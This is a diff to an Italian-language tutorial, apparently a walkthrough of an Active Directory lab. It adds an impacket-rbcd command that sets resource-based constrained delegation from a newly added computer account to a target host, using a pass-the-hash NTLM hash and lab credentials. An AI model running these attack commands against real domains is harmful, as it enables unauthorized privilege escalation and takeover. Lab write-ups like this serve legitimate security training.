@@ -39,4 +39,7 @@ Quindi per prima cosa aggiungeremo un nuovo computer al domain
 ```bash
 impacket-addcomputer -computer-name 'rbcd_const$' -computer-pass 'rbcdpass' -dc-host 192.168.56.11 'north.sevenkingdoms.local/arya.stark:Needle'
 ```
-e settiamo quindi 
+e settiamo quindi rbcd
+```bash
+impacket-rbcd -delegate-from 'rbcd_const$' -delegate-to 'castelblack$' -dc-ip 192.168.56.11 -action 'write' -hashes ':b52ee55ea1b9fb81de8c4f0064fa9301' north.sevenkingdoms.local/'castelblack$'
+```
